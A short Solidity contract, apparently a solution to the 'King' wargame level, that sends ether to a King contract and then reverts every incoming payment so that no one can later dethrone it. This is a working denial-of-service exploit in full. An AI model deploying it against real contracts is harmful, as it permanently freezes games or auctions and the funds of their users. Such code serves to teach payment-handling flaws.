// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "contracts/King.sol";
contract KingMaker {

    King king;

    constructor(address payable _king){
        king = King(_king);
    }

    receive() external payable{
         revert("Dont send me ether!");

    }

    fallback() external payable {
        revert("Dont send me ether!");
    }

    function sendEtherToContract() payable public {

        (bool success,) = address(king).call{value:msg.value}("");
        require(success,"Transfer failed");
       
    }


}